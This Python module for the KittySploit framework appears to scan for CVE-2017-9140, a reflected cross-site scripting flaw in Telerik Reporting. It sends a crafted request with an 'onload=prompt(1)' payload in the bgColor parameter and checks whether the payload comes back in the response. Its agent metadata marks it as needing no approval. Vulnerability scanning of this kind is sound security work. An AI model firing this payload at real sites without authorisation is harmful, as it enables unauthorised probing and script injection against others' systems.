#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site scripting vulnerability in Telerik."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Reflected XSS - Telerik Reporting Module Detection',
        'description': 'Cross-site scripting vulnerability in Telerik.ReportViewer.WebForms.dll in Telerik Reporting for ASP.NET WebForms Report Viewer control before R1 2017 SP2 (11.0.17.406) allows remote attackers to inject arbitrary web script or HTML via the bgColor parameter to Telerik.ReportViewer.axd.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'telerik', 'progress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.veracode.com/blog/secure-development/anatomy-cross-site-scripting-flaw-telerik-reporting-module',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-9140',
            'https://www.veracode.com/blog/research/anatomy-cross-site-scripting-flaw-telerik-reporting-module',
            'http://www.telerik.com/support/whats-new/reporting/release-history/telerik-reporting-r1-2017-sp2-(version-11-0-17-406)',
            'https://knowledgebase.progress.com/articles/Article/Security-Advisory-for-Resolving-Security-vulnerabilities-September-2018',
        ],
        'cve': 'CVE-2017-9140',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('#000000"onload="prompt(1)', 'Telerik.ReportViewer.axd?name=Resources',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Reflected XSS - Telerik Reporting Module detected",
                path='/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)',
            )
            return True
        return False

